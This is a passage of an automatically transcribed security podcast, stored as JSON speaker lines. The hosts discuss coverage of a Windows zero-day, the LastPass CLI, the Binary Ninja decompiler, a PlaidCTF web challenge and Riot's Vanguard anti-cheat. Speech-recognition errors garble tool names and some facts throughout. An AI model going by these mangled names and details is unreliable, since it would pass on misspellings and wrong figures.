why would you even say the\", \"start\": 1393.3}, {\"speaker\": 3, \"line\": \" windows zero day is a nice clean RC said want the sources?\", \"start\": 1444.4}, {\"speaker\": 2, \"line\": \" Yeah a nice clean. RC I mean, it's nice a\", \"start\": 1450.9}, {\"speaker\": 3, \"line\": \" clean. So like that's you know, probably mistake there. But yeah,\", \"start\": 1454.4}, {\"speaker\": 2, \"line\": \" I just I thought that was a great quote to summarize how nonsensical some of this was because it's just as some veteran right? I don't even know if that was someone that they've interviewed that could guess either to\", \"start\": 1459.7}, {\"speaker\": 3, \"line\": \" be fair. I could understand like some veteran not wanting to associate their name with no knowledge of some of that yeah. Well, I just I mean that you know, the quote\", \"start\": 1469.3}, {\"speaker\": 2, \"line\": \" was the best part is that it seems like something that literally is meant to cause clicks that you go and still like screw. You know, this is perfect for terrorism or some crazy shit at me like why would you why would you even say that like, why would you because like dude I can tell you my my team and all these other like companies they had to spin up nonsense like little investigations to figure out because of that quote right there perfect for industrial industrial Espionage like based on what because it's a Exploit, like I just thought was hilarious. I understood maybe where you could link the two together, but it's just a great quote that I want to start writing articles. Like they're actually just slowly it\", \"start\": 1481.6}, {\"speaker\": 3, \"line\": \" ago. I did mention that like one place is like if you're going to use this exploit like that would or wouldn't really be too useful in the industrial Espionage area because you need already be on a call with somebody for it. So like I guess you can use it like if you exploit somebody during like a sales call or something like I could see something there but I mean You'd more like it at least again. I'm not like some experience exploiter with doing like any sort of industrial Espionage, but I can't like I'd want to see something that could be used more for a spying. If you're going to talk about Espionage like that words. This is bless that like, you know, if you could join the call without being seen That would be something worthwhile for that would be some that's perfect for industrial\", \"start\": 1516.5}, {\"speaker\": 2, \"line\": \" Espionage. I feel like that's what they misunderstand is that like Espionage isn't meant to be like obvious like something that would tip them off, you know, like that feels like and I still you know, I'm not deep enough into the excellent world. I really would be curious if someone could replicate knowing that it has to take place during a call that's gotta be a certain call to like some type of media library right since I put streaming thing that occurs when you call someone, you know relating to VoIP or something, right? Right, so\", \"start\": 1565.3}, {\"speaker\": 3, \"line\": \" I'm here could be similar. You know, we've seen some WhatsApp or Whatsapp vulnerabilities. There's that one Precor pre acceptance vulnerability a while back.\", \"start\": 1592.3}, {\"speaker\": 1, \"line\": \" Yeah, there was a gift one as\", \"start\": 1602.2}, {\"speaker\": 3, \"line\": \" well. Yeah, although that word of the person. Yeah, but the gift one is a little bit different but I mean if you could do something like that with the audio library that could be kind of where this\", \"start\": 1603.3}, {\"speaker\": 1, \"line\": \" sits funnily enough. I mean this isn't two related, but I'm pretty sure in the console Hawkings. One of the three DS vulnerabilities that was used to jailbreak. The Nintendo 3DS was actually in the audio library one of the like I octaves or something for\", \"start\": 1613.7}, {\"speaker\": 3, \"line\": \" so we're to jailbreak 3DS. Did you have to scream at your 3DS in a particular particular one I know is that would that would be a really\", \"start\": 1629.8}, {\"speaker\": 1, \"line\": \" cool that would\", \"start\": 1636.7}, {\"speaker\": 3, \"line\": \" exploit if it's like you scream at this pitch. So going back, you know like a Captain Crunch for now was a 44 megahertz or whatever. That was.\", \"start\": 1638.6}, {\"speaker\": 1, \"line\": \" I don't think it was in the microphone. I think it was in like the for playing audio for games and stuff.\", \"start\": 1651.0}, {\"speaker\": 3, \"line\": \" Yeah. Well, I wouldn't imagine it was like that but just mentioning it could be sneaky think of some sort of exploit that you could do verbally like that going back to the whole freaking days.\", \"start\": 1655.8}, {\"speaker\": 1, \"line\": \" Maybe there could be an Alexa one. But yeah, I think we can we can move on to some news. The first one is how I reverse engineered the last CLI tool so this one is far longer than I expected it to be it's a very long article. So we're not going to be covering the full\", \"start\": 1665.9}, {\"speaker\": 3, \"line\": \" thing actually brought it up not so much because I want to cover the entire thing. But just basically what this guy did sorry to have just cut you off and Jump Right In Specter, but basically I'm what he did was he took the last past command line tool which is open source, and he basically rewrote note that as morpha library that you can use in in Rust I mean, I think anti do you want to stay on for this topic or since the first to wear the\", \"start\": 1683.8}, {\"speaker\": 2, \"line\": \" yeah, I'll stay on for this last topic and then I'll hop off the few wanna. All right towards ya\", \"start\": 1717.4}, {\"speaker\": 3, \"line\": \" I'll just keep going. So I mean, there's no point I think in talking about everything that he found what I thought was interesting though was this is fairly consistent with what LastPass has put out in the past. So one of the big issues with LastPass is you kinda have to trust what they say in their white paper what they saying their documentation is actually what they're doing. And of course you can go and validate that by looking, you know, in this case it how the command line interface actually works how that's all for works out generating the passwords how it's using them what it's sending all of that you can go and do that. So this is somebody that has gone and done that has documented the process and while he doesn't don't think he doesn't call it out, but it was fairly consistent with what last past has put on that's just the positive sign. With LastPass is actually doing what they claim to be doing. And I also just wanted to call if there's definitely misunderstanding as to how these\", \"start\": 1722.9}, {\"speaker\": 1, \"line\": \" cloud-based password managers\", \"start\": 1779.3}, {\"speaker\": 3, \"line\": \" work. I won't drop any names in particular, but I remember being on another twitch stream and the guy just meant like, you know, if you're letting the cloud know all your passwords or something. You're just doing it wrong. There's it was something like that where you basically had the idea that password managers actually knew what your passwords or and how LastPass Works how be awarded Works how basically any of the cloud or centralized storage password managers work any of the big ones, at least I'm so I'm sure there's some random one that's just implemented stupidly. But they don't know all of your information. They encrypt they basically just store this encrypted blob that is only decrypted on your side. They have separate keys to do your authentication to authenticate the you're allowed to see that blob versus being able to actually decrypt The Blob the keeps guys split up into three parts stored in different places. And you're the only one that actually brings them together with your master password. That's kept local of long story short. Basically this what I thought His interest here is just he found you know, a lot of consistency with what we've been informed about and in theory, this is somebody else. I'll say if you really want to trust you have to go look yourself, but this does seem to be kind of somebody independent coming to the same conclusions about how it's working what it's doing and just generally a positive sign. It does mention, you know reverse engineering he starts with the source code of L pass. So it was kind of thing. It's not reverse engineering sing. Yeah. Yeah, but I mean that wasn't really the aspect I cared but I just want to point this out of something that it's got the consistency there. Like I'm a fan of these cloud-based password managers. I completely get why you would want to take it a step further and store it and use like a key pass or something, you know, not use the cloud based system completely fair, but the biggest concern are people re using passwords. That's what you want to prevent make a convenient not\", \"start\": 1781.2}, {\"speaker\": 1, \"line\": \" to reuse passwords. So it's better\", \"start\": 1910.1}, {\"speaker\": 3, \"line\": \" that they Keep just kind of the general public uses something like LastPass. Then keeps reusing passwords.\", \"start\": 1911.6}, {\"speaker\": 1, \"line\": \" Yeah, and the nice thing about some of those some of those password managers like LastPass to is they allow you to use some stronger authentic like dual off along with a master password. So even you know, there is that idea that a master password if somebody can break your LastPass account. They do get all your other passwords, which could be a concern but\", \"start\": 1919.1}, {\"speaker\": 3, \"line\": \" that's a concern though\", \"start\": 1938.3}, {\"speaker\": 1, \"line\": \" way the duel off as well because you can Can attach things like a yubikey to it if you want, I think that might only be available to LastPass premium, but you do get access to some of those other more secure authentication methods as well with password managers, which I think is\", \"start\": 1939.5}, {\"speaker\": 3, \"line\": \" yeah. There's always the risk though that last pass itself will be compromised and those votes will be leaked which you know aren't protected like you there's no way to kind of add the MFA to the Vault itself. Like that's kind of added by LastPass are browned making the request to get the vault. Yeah, so there's always that chance that something like that happens. And that's why just how they start the fact they don't actually store it. Like how the keys I'll work how they can't actually get corrupted themselves cat three thousand nine touches on what I was just saying and I salute for passwords is keepass with encrypted database and a Dropbox or clout and I mean I get why people do that. There's a convenient to aspect to using LastPass to using some of the other systems. I agree though, like using keepass is going to be you know, it is an extra step of security. It's also an extra step of work more talking about kind of getting everybody in the masses using it. Something like LastPass is far more convenient than being to make sure you always have that encrypted database around. That's said that is still a better step. I'll but at this point, I don't think the world's ready for that to be the default recommendation. It's not that I disagree with that recommendation. But I mean you're basically you're deciding that you know how to store that encrypted database better than LastPass who it's basically their whole goal is storing those fault among other\", \"start\": 1953.5}, {\"speaker\": 2, \"line\": \" things. I think I don't have a good point. I want to make that you know, like there's lots of good hacky Solutions you can do, you know, like you can encrypt it put it on USB dig and on to your house and stuff like that, but you know kind of like what you're talking about. I think it's the convenience, you know, if you want to get like a regular users to actually use these things and not using no hacker 13 as their password over and over and over again, you know, this is really the only solution I think that works for normal people but But you know, I think it's good that like actually see people like this are you know, testing out all the tools available, you know to this type of thing because you never know who's going to be using what right, you know, if they use the CLI only\", \"start\": 2042.3}, {\"speaker\": 3, \"line\": \" yeah. Well, so I think part of this is so you can kind of use LastPass embedded in another application pretty much as a library. Yeah. It's taking us Library. I imagine last passes didn't release it as a library pretty explicitly to try and prevent that from happening. Obviously. I think they knew They could have totally prevent that but I'm going to guess somewhere in their terms. It probably does this allow a kind of fronting like a or Y washing LastPass is your own service,\", \"start\": 2085.3}, {\"speaker\": 1, \"line\": \" which doesn't kind of interesting why they would make that command line tool open source, if they didn't really want that I guess just for the transparency asked.\", \"start\": 2116.3}, {\"speaker\": 3, \"line\": \" Well. Yeah, I mean I Probably I mean they document well enough like you could reverse engineer from the JavaScript of the extension to like it's not like it's hidden stuff. Oh, no, I just feel like it was probably an intentional decision and not to not to actually release a library like that.\", \"start\": 2124.3}, {\"speaker\": 1, \"line\": \" Yeah. It's probably Fair anti or you're going to be staying on for our next discussions. Are you gonna hop out?\", \"start\": 2149.4}, {\"speaker\": 2, \"line\": \" Well, I believe it. Time for me to hop out gents but it was a pleasure as always. All right. Thanks for joining us. Thanks. Y'all have a good one. Okay.\", \"start\": 2156.1}, {\"speaker\": 1, \"line\": \" So with that we will move onto probably the biggest topic of the week and that is binary ninja we have a split into two separate topics because they did a blog post as well. So the first one is the blog post from the devs and talking about hit it Benja 2.0 hitting Dev and what kind of things are dropping with it as well as the H LL or the decompiler, which we'll talk about next but there's some notable things dropping that like outside of the decompiler as well that they mentioned in this blog post. So a few of those are they're releasing an official plugin for debugging so they have some screenshots showing, you know, they're debugging front end. They have the register View and all that kind of stuff.\", \"start\": 2164.5}, {\"speaker\": 3, \"line\": \" So, I believe they've already released this plug-in whether or not it's been Usable, yeah. Yeah, that's what I was saying. But yeah, it's been released it is kind of available there.\", \"start\": 2203.9}, {\"speaker\": 1, \"line\": \" Yeah, and then some of the other like notable things they've dropped is a merge tool for collaboration and a new xref panel, which is really awesome. That is one one of my biggest gripes with binary ninja when I was using it last was the cross-references panel was kind of annoying to work with I think like you couldn't even really pop it out before and it was all just it was very simplistic and and basic you couldn't really get too much information out of it. But their new one that they're doing. Let me just go back to what the new one that they're doing actually has like a lot of information. It has the the type information in there and it talks about if it's a data reference or code reference. So I really like that new crop cross-references view. I think that's probably like that's that's personally something that I've been looking forward to so, you know, I don't know if I really use a debugging front end, but I know there are people who You know, that was one of the biggest things where people didn't want to switch from Ida the binary ninja or Deidre for example, is that fact that Ida has the debugger and benjin Deidre don't yeah. I mean, it's definitely like that arguments kind of disappear.\", \"start\": 2216.3}, {\"speaker\": 3, \"line\": \" It's a consistency thing to like if you just kind of you get used to having the one environment where you're able to do everything, I mean, there are there is a nice part of that. We're having it built into wood because I assume with the plug and eventually we are going to be able to swap out. What the back Back end debugger actually is or perhaps you can do that. Now. I have not use the debugger yet. That'll be a big thing where you can use remote debug servers start debugging stuff and other things and just nice to have that convenient like the same interface cross everything rather than being too kind of like hack things together. I get why people want that? I don't know. I know\", \"start\": 2280.8}, {\"speaker\": 1, \"line\": \" for me personally look into to just like if you can Implement like, you know a custom debugger back. And stuff like that. I feel like the\", \"start\": 2322.7}, {\"speaker\": 3, \"line\": \" odds are they'll get to the point where you know, it's pretty easy to swap that out. If it's not already easy to do\", \"start\": 2330.4}, {\"speaker\": 1, \"line\": \" that. Yeah, the main reason I think that would be interesting just for me personally is where I work on PS4 stuff that could be like a really cool plug-in to do is like a PS4 debugger through Benja, but it could be useful for like other iot stuff too.\", \"start\": 2336.1}, {\"speaker\": 3, \"line\": \" So looks like they do mention using G DB server. So then that means anything that implements a to be service should be usable I imagine. Makes sense. So at least that far is good. I don't know what I don't know what they're using on\", \"start\": 2350.6}, {\"speaker\": 1, \"line\": \" windows. So I was going to say it sounds like there has to be something for Windows because that is a pretty big user\", \"start\": 2365.1}, {\"speaker\": 3, \"line\": \" base. Yeah, so I'm going to assume they already have support for various debuggers. Actually. I just I don't see it explicitly listen listed here. But I would have to assume they've already got\", \"start\": 2370.8}, {\"speaker\": 1, \"line\": \" that know how they have like window bug support or something like that. But yeah, well, we'll have to see but yet not too much to talk about there, but it is cool just to see that it's not only the decompiler dropping but there is also the debugger dropping at the same time, which is like two of the major things that binges needed for a while. So, you know talking about the decompiler will jump into that as well. So played CTF was happening over the weekend and Vector 35 actually teamed up with them did like a little collaboration. Ocean and they dropped the decompiler on the dev Branch just in time for played CTF and I think they also gave away eight commercial licenses to the winning team of played CTF as well. I'm surprised you haven't jumped in yet Incorrect and me because I know it's probably supposed to be plaid CTF.\", \"start\": 2383.4}, {\"speaker\": 3, \"line\": \" But yeah, well we were talking we already talked about that before the show, so I didn't think break head up here that said yeah eight gave it away, but it is on cloud and I want to mention right up front there is A little bit of an issue with the cloud one versus what you get with the actual product while he get with the paid when I did notice a couple differences there and I think we're going to kind of jump into what this decompiler is actually like so I think that's kind of some that matters here. I was definitely excited to see hli all being dropped. Oh,\", \"start\": 2426.0}, {\"speaker\": 1, \"line\": \" I didn't expect that this soon. I thought it was going to be another month or two at least.\", \"start\": 2461.6}, {\"speaker\": 3, \"line\": \" Yeah, like it seemed like they were teasing it a fair bit like they Up the amount of teasing they had towards it in the last week. So I'm not entirely surprised that said I will say this drop like it did give me to go and buy a commercial license another big part of that was Ida home complete disappointment. I just want to put my money behind a company that's actually trying to Improve the state of things rather than just kind of being the status quo nonetheless, you know, let's talk about the decompiler. I'll know my initial thoughts just really simple initial thoughts. I wasn't disappointed. I wasn't insanely impressed, but I wasn't\", \"start\": 2465.2}, {\"speaker\": 1, \"line\": \" disappointed. Okay. So I mean there I've seen a few gripes about the binary ninja decompiler. One of them is State they went with a weird choice of just using strict indentation python style and not using any braces for code block. You\", \"start\": 2508.6}, {\"speaker\": 3, \"line\": \" know what I hate that right though. So, yeah, so I'm actually going to pull up a screen shot from the decompiler here or well a few screenshots that I\", \"start\": 2523.6}, {\"speaker\": 1, \"line\": \" have. Okay, while you're doing that. I will say that wasn't the only one the other one was the variable naming the Variable naming people find pretty weird and unintuitive just the way that it's like VAR underscore. I guess I too like x-rays kind of does the same thing but like going 18 underscore one like they kind of just keep a pending these indexes on to it and it's kind of hard to follow that being said, I don't know like I can't really yeah Center Solution on the spot, but that is one other, you know complaint I saw that was common across different\", \"start\": 2533.2}, {\"speaker\": 3, \"line\": \" jae-min. I believe the 18 is the offset like when it's far. Or it's the offset on to the stack for where that was kind of like the first time it's initialized. So like there is some reasoning behind it. I believe that said when we're talking so I pulled up the screenshot. This is from Rob emporiums Bad characters challenge. Somebody actually on the re Discord server kind of pointed pointed out some other things with that particular challenge that'll bring up but in terms of the code block, so you'll see here that Don't use curly braces around anything. They just do indentation. So so I can understand why people are like, oh, I don't like that code style. You're not writing this code though. You're only going to read it. And the reality is that adding those braces is purely because this isn't see. I mean there's other things. I've make this Nazi you're not writing this your only need to read at the only thing that those braces will add is empty lines. That's the only thing it adds. So I would rather, you know, just like reading the disassembly it's usually fairly concise and all right there. Those braces only are going to be adding empty lines that don't actually add any meaning.\", \"start\": 2566.4}, {\"speaker\": 1, \"line\": \" I think it's just one of those things where people want to be familiar with like they do equate decompiler with like see like output so they expect to see that and when it's not there just kind of makes them a bit uncomfortable. Yeah. No. No, I can't I don't really agree with that like ripe either. I don't think the braces are too important of a\", \"start\": 2646.0}, {\"speaker\": 3, \"line\": \" yeah. I didn't even notice it actually so I noticed that with one case where it was like an if statement because I've mentioned that's one of my pet peeves doing if statements without braces around it like one liner without Braces around it. Yeah, we had a little discussion about that. I noticed was that I didn't even go and look they're using it elsewhere though. It wasn't till somebody else pointed it out that I even noticed that it was doing that. Um that said other gripes one of the big things if you notice some we've got the two for loops and then if statement zi X Cube brackets zi x dot d bracket star bracket, those all those resizes actually. I think I have a better. Picture of that\", \"start\": 2662.8}, {\"speaker\": 1, \"line\": \" does basically saying zero extended quads or\", \"start\": 2706.5}, {\"speaker\": 3, \"line\": \" extended. Yeah, so it's all these resizing but if you look at this other picture I've got here um in theory, so actually I'm going to take from you catch 3009 nice feature of decompilers is the ability to copy and paste code C++ compiler. It should compile without errors. I don't know if I've ever actually had that happen with even it?s output. maybe you have I don't think I've ever actually had some that will just compile immediately unless it was like some simple, you know application, but Yeah, so I could see that maybe for is no I just met but I haven't actually had that works re-cap mentioned zi 2 supports it. My experience has been that that hasn't actually been what happens in practice.\", \"start\": 2709.0}, {\"speaker\": 1, \"line\": \" I was just going to say in CTF challenges. I can see it maybe where you're dealing with like a you know, not a complex binary you're talking about anything real world though. There's almost no way that's gonna you know, just straight-up compiled without you doing a bunch of stuff as well. So I mean I can kind of see that argument but at the same time, I don't know how many people are actually doing that.\", \"start\": 2758.6}, {\"speaker\": 3, \"line\": \" Yeah, like I I definitely like I've tried it just for fun T realize the expected that definitely didn't work that way if maybe Ida has improved since I last tried because essentially what it was was I tried it. It didn't work. I never really cared to try it again. So, I mean what the binary ninja is definitely done here is they have knock on for a see style thing. They've mentioned the possibility of doing that before but they very explicitly they're not going for see. With you know, obviously these so coming back to these extensions of these extensions are happening in the assembly. Like it is actually there and assembly you'll see the move actually making those different sizing extensions, but it does make it very hard to\", \"start\": 2781.4}, {\"speaker\": 1, \"line\": \" read. I will say I would have rather if they went with like cast like c-style casting just like, you know for quadword just do you and 60/40.\", \"start\": 2838.5}, {\"speaker\": 3, \"line\": \" Yeah, so and they be more this is something they plan to change like this was actually something brought up really early on in their Twitter feed like within the first hour of being released. They're like, yeah, we do plan to optimize some of that. I had to do some so that's something replying to work on. That is something important here. This is the beta of it's still this did just drop on the development update streams. It's not the final release of it. I imagine regardless they're going to keep working on this. That's why I said I wasn't super impressed, but I wasn't disappointed. This is a very promising start.\", \"start\": 2847.7}, {\"speaker\": 1, \"line\": \" So one positive I will mention I haven't checked it out and I'm going to check this out on the stream, which I'll talk about in a few minutes, but one thing I have heard that this decompiler is better than both X-rays and Deidre in is handling some of the extended instruction set stuff like SSE. I've heard it it generally it optimizes that a lot better than x-rays does\", \"start\": 2881.8}, {\"speaker\": 3, \"line\": \" actually it's not tonight though. I'm not too much extended but did find that it basically doesn't support floats. My day taking screenshots, but it's like I forget what the instruction was here that it was failing on but it was just like a move with XMS with the xmm registers.\", \"start\": 2904.2}, {\"speaker\": 1, \"line\": \" Okay. So I think that is one thing I've seen those well is that it does need to meet each other a little bit. It is missing some instruction register Ops, I think comparing exchange is another one that doesn't really seem to be supported. So but like\", \"start\": 2923.1}, {\"speaker\": 3, \"line\": \" what it's about some of the water\", \"start\": 2938.5}, {\"speaker\": 1, \"line\": \" But yeah, obviously this decompiler literally just dropped x-rays has been around forever. It's been around for years Deidre has also been in development since like the 90s. So, you know, this is for considering this is a fairly new decompiler. It's obviously not going to be Flawless. It's not going to be without issues but it's going to get that maturity over time and as we've seen with with Benjo with other features, they don't just drop something and then stop working on it. I imagine this decompiler is going to be worked on for years. It's going to be an ongoing thing and as it matures, you know, it's going to get better and as an initial initial starting point, I think this is great. And you know, it's an option out there for people that don't want to use Ghidorah, but also don't want to pay like 10 thousand dollars for all the Ida licenses. But I mean,\", \"start\": 2941.5}, {\"speaker\": 3, \"line\": \" yeah, no animal. I mean this this is also totally exposed through like the API and stuff\", \"start\": 2989.4}, {\"speaker\": 1, \"line\": \" to which is another big\", \"start\": 2995.9}, {\"speaker\": 3, \"line\": \" benefit. Yeah. That's it. Here's I am going to pull out a few. Rights, here are a few other issues that we've noticed. So I pulled up the graph you now. This is what you'll see if you use cloud and this is I was mentioning earlier about how the cloud isn't quite the same. So this is that same Bad characters or what was the function call. I think it was like check Bad characters or something is the function name from The Bad characters Rob Emporium challenge if you were paying attention on the video before or if you can't see anything what we see right here with a graph as we see a while loop and we see the VAR being incremented at the base. We see those think what would you see the two increments actually because it's a double for Loop but it treats them in the graph view as wild Loops. Whereas in the linear view, which you do not get in in the free version right now and Cloud. It gives you the four Loops. It gives you something that in my opinion is much more readable than what you see in the graph View. That's interesting. So it basically it seems like a prefers to decompile as a while loop when you're seeing the graph which kind of makes sense because those like parts of the for happening different areas. So make sense to show how things jump around in that whereas the linear view makes a little bit more sense to just show it as is like I kind of get where that came from, but it is worth noting because I did see some complaints about not picking up for loops and I think that's Why I think it's because for those basically only show up when you're in the\", \"start\": 2997.9}, {\"speaker\": 1, \"line\": \" linear View. That's really interesting. I never noticed that but yeah, that being said I do want to bring up that tomorrow night probably at like 8:00 p.m. Eastern. I will be doing a stream looking at Benja because I haven't personally since I don't have a commercial license, I'm not balling out that hard but um, you know, I'm going to be looking at the decompiler and comparing it to geed ra seeing like where it's better and trying to check out some of the complaints that I've seen see how much like Merit they have and whether there's a way around it and stuff like that. So I am going to be Doing a string that's going to be exploring that tomorrow. So I do just want to shout that out just in case I forget to show to their to the begin at the end of the episode as well. So, you know just for anybody that's interesting that I will be doing a stream about that and we will probably be doing a more polished video that looks at it, you know without all the you know things that come in the string. We're going to be doing a video on that too. So be on the lookout for that. Yeah. Something\", \"start\": 3092.5}, {\"speaker\": 3, \"line\": \" said. Yeah, go ahead.\", \"start\": 3146.5}, {\"speaker\": 1, \"line\": \" I was thinking we'll probably move into more of the CTF. So\", \"start\": 3148.8}, {\"speaker\": 3, \"line\": \" actually I want to go on with one. Are really big issue and that is brutal. Okay. Well, so this is like I'm going to say this is probably personally I see this is something that's going to get fixed very quickly. But if you take a look this check Bad characters function notice the start if at the bar 28 equals 0 x 62, yeah and the for Loop just kind of uses the relative act like it but it's basically looping through the indexes for each character in 4H back. Character if you look at the ml IL though for this function, we noticed something really important, which is that the ml IL has a bunch of assignments earlier on it has the far 20 a far 2726 it assigns the entire array because this is obviously a array being declared on the stack. So it's doing that initialization there as you call in the function at setting up the entire stack with all of the bad characters. Oh decompiler completely optimizes that now Is it is there in the ml I also like it knows it's there. So this seems like something that because the actual Loops only access these indirectly. It doesn't really associate them together. So it's a failure on their part. It seems like a failure that's more like an optimization thing where it's like, oh, hey these variables are he is let's just not show them. It seems like an overzealous optimization that can be tamed back a little bit rather than a really significant. Issue with the decompiler, but it is there right now like that is a huge issue. It just seems to me like it's something that can and will be fixed pretty quickly. But yeah, I just want to point that one. I would also because like that it that's that's a pretty serious issue to be missing\", \"start\": 3151.5}, {\"speaker\": 1, \"line\": \" that but that is a good example though of why you should never completely trustee compiler output alway and especially with ginger because you have access to those other intermediate levels. You have the MLL on the LOL.\", \"start\": 3259.1}, {\"speaker\": 3, \"line\": \" Yeah, which is what I love\", \"start\": 3271.9}, {\"speaker\": 1, \"line\": \" here is The lower levels to see to catch stuff like that. That's missed in the decompiler output.\", \"start\": 3273.0}, {\"speaker\": 3, \"line\": \" Yeah, like generally speaking anybody that's kind of looking at this is going to realize you know, it seems like something's kind of missing here with how it's like you're going to kind of notice that it's just doing the the offset access and you can jump down like said right to the ml IL or go, LOL or the December you can jump to all these different levels and give more information out. And I guess to end on a positive note one of my favorite things. It's super small, but I just I just love kind of the fact that it's there and this happens in ml il-2 is they will preface the comparison. So like less than equal to greater than or whatever with a you were in s letting you know, if it's a signed or unsigned\", \"start\": 3277.9}, {\"speaker\": 1, \"line\": \" comparison that is really nice.\", \"start\": 3319.7}, {\"speaker\": 3, \"line\": \" And I mean, that's something you kind of lose when you go to see it's just not there unless you know the types and you know how they're going to get upgraded down gray, whatever to know how that's going to get compared.\", \"start\": 3321.6}, {\"speaker\": 1, \"line\": \" I said the reason that's really useful is like there are absolutely sinus issues that can lead to some pretty serious bugs and overflows. Yeah. So if you're not, you know paying\", \"start\": 3331.6}, {\"speaker\": 3, \"line\": \" attention to the touch so it's a quality of life thing. That's there. It's just right there. It's information that matters to you that is a really included in like C code that they get to do because they're it's technically not see what they're doing here. So like that, that is one feature that I do really. Really like and here it's super small, but it's just it's such a quality-of-life thing that just they kind of understand how people are using their\", \"start\": 3340.9}, {\"speaker\": 1, \"line\": \" product. So overall, even though we have highlighted a few of the gripes overall. It's definitely a positive. I think it's you know, it's going to get better over time. It's a it's a good starting point. I think overall, you know, it's been well-received. I'll say that yeah, it was a cool idea that they dropped it with the CTF as well though. I do wonder how many serious teams would want to switch up their tools like at the last minute, you know an hour before the CTF, but, you know, they're probably worth some and they probably got some useful. For feedback out of that as well. So, you know, I think I thought that was a pretty cool move. But zi you had some stuff to say on played CTF\", \"start\": 3366.7}, {\"speaker\": 3, \"line\": \" specifically. Yeah - you're moving away from Benja before we move on to that. I will mention of chat again cat 3000. I meant has anyone tried realize I feel like we've discussed real not on not on the episode before but I feel like we've personally discussed using realized before I haven't used it. I don't think you have either\", \"start\": 3404.9}, {\"speaker\": 1, \"line\": \" I feel like I tried it and it was yet another tool that failed on large. Aries so, okay. Yeah, I do but I feel like I've tried it before and I didn't I wasn't happy.\", \"start\": 3422.0}, {\"speaker\": 3, \"line\": \" Yeah, I remember us talking about it. Like I definitely like it was I think before we even plan to start the podcast like sometimes last year or something. Yeah, so, you know, I will preface\", \"start\": 3433.8}, {\"speaker\": 1, \"line\": \" that by saying it could have gotten better for sure. Maybe I'll give it another shot. But you know when I did use it when you were talking about about a year ago, I you know, it wasn't too impressive for me.\", \"start\": 3446.1}, {\"speaker\": 3, \"line\": \" All right. So now that's been hell. Yeah. I want just call a plot to have I mean obviously plaid parliament of pwning PPP good team always usually really good challenges. I wasn't really planning to play the CTF this weekend, but I have to go and look and just kind of pulled it up early on and shortly after it started and I saw a web challenge for 500 points and the only other 500-point challenges were to potable so that immediately caught my eye. I don't like 16 hours possibly more of good hard work into that challenge and could not could not solve it. So I I just want to I call it out its catalog. I don't know if they release their challenges if they do that. That would be a fun one to go back to the solutions. Actually pretty cool. Like I did kind of figure out by the end. How to get the solution I just didn't get it working but it took advantage of like a new Chrome 80 feature using deep-linking using that kind of exfiltrate information. Sorry for some spoilers. I don't want to go into too much detail with the spoiler. So I just want to thank all those it was an interesting Challenge and while I didn't look at anything else. Odds are a lot of their challenges were good. If they do reeling some check it out\", \"start\": 3457.5}, {\"speaker\": 1, \"line\": \" the did you see any like, I know you nobody saw exactly how large was going to say. I know you've known some CTF players in the passage. You see any opinions from that mommy CTF overall.\", \"start\": 3542.3}, {\"speaker\": 3, \"line\": \" Um, I haven't really asked around or anything. I mean PPP is general like Platts ETFs. You shall hear very well regarded CTF. I have no reason to think they're not people would have a negative opinion about this\", \"start\": 3553.5}, {\"speaker\": 1, \"line\": \" one. The only reason I say that is as time has been going on. You know, I haven't been following CTS too closely for a while. But the ones that I have tried and you know, seeing opinions of people who have been playing CTS, it's been generally found that CTS are becoming more and more gimmicky by the year, you know, they've kind of yeah of tricks and they're trying to use these obscure things that almost nobody would know and they just have to like Google some rent like get lucky Bay. Clay with a Google search term.\", \"start\": 3566.8}, {\"speaker\": 3, \"line\": \" Yeah, so I mean that's kind of the things\", \"start\": 3599.2}, {\"speaker\": 1, \"line\": \" that's going that direction too.\", \"start\": 3602.9}, {\"speaker\": 3, \"line\": \" Yeah, so, I mean that's definitely the thing. I've saw planks ETFs a lot. Now for that reason also is like years ago and I actually even said this on want the podcast that I recommended playing a CTF, but the more I've really thought about it the more I realized that no like currants ETFs aren't that good now War Games the kind of long-running C caps are still great for learning from but these the competitive CTF says he said They've become a lot more gimmicky. That's Ed with this one. Like said I spend like 16 hours and I never felt frustrated with the challenge. I never felt like the challenge was unfair and that's that was actually really impressive because usually if there's a web challenge and like I'm banging my head for that long odds are it's some sort of guess work or something, but I was always finding little things that I can maybe abuse. It was just coming up with how to work everything together. I mean he had to chain a bunch of issues can't get this one to work, but they included enough information to kind of lead you towards understanding what he needed. Like I mentioned use that Chrome 80 deep-linking thing, but they explicitly mentioned like it's being viewed from chrome 80 with you block whatever version so you go and you look like okay, what's in Chrome\", \"start\": 3604.3}, {\"speaker\": 1, \"line\": \" 80, you\", \"start\": 3677.4}, {\"speaker\": 3, \"line\": \" know, why aren't they using Chrome 81 or whatever the latest version\", \"start\": 3678.8}, {\"speaker\": 1, \"line\": \" is.\", \"start\": 3681.8}, {\"speaker\": 3, \"line\": \" So like they had enough there in terms of the hints to drive you towards the solutions.\", \"start\": 3684.0}, {\"speaker\": 1, \"line\": \" Okay, cool. I was just wondering because that did sound a little bit gimmicky when you're first describing it. But now that you've said that they gave those hints and stuff. I you know, I\", \"start\": 3689.4}, {\"speaker\": 3, \"line\": \" I never I never felt like it was John who won fair I could understand why somebody would look that nothing to look at Chrome 80 just think okay. It's on Chrome whatever so, you know things Chrome fixed. I don't matter like, you know be aware that Crohn's a little bit different than Firefox. Like I could get why somebody wouldn't get that step but they did include that information and and I've kind of learned with a loss ETFs. You've got to read the descriptions. Well, in this case the description actually they explicitly said there's no hint in these big long winded description, but everything else here is what he need to worry about and it was in that other section that included the Chrome 80 that included other things\", \"start\": 3697.8}, {\"speaker\": 1, \"line\": \" So we can move on to Riot games. So obviously, you know, if you follow the gaming world at all Valerie, it's been kind of blowing up and one of the reasons has been blowing up is it's almost like a Counter-Strike clone, but IT addresses a lot of the complaints that come from Counter-Strike players and one of those is cheating. So, you know, they're trying out a new AC called Vanguard for Valor and and the ACs had some controversy over the last little while some stupid controversy. I'll say so in my opinion because it's a kernel driver and it's loaded at boot. It's not loaded when the game is launched and they do that to try to you know, that way they captured the state, you know, they load it basically before any cheat would be running.\", \"start\": 3742.5}, {\"speaker\": 3, \"line\": \" Yeah, and that's like that's what you think going zi. Well, I don't think we want to dig too deep into it. I will mention like, you know, they load early on because the earlier you load earlier you're able to like the harder it is for cheats to get in there. Whoever With the first it's going to be able to control kind of what what gets reported.\", \"start\": 3785.5}, {\"speaker\": 1, \"line\": \" Basically. Yeah,\", \"start\": 3805.6}, {\"speaker\": 3, \"line\": \" so it is a cat and mouse game at that level and they've had a lot of Specter was saying a lot of complaints coming in about you know, it's always running there and there's been complaints about the Chinese aspect are they've got some ownership from tencent. Yeah.\", \"start\": 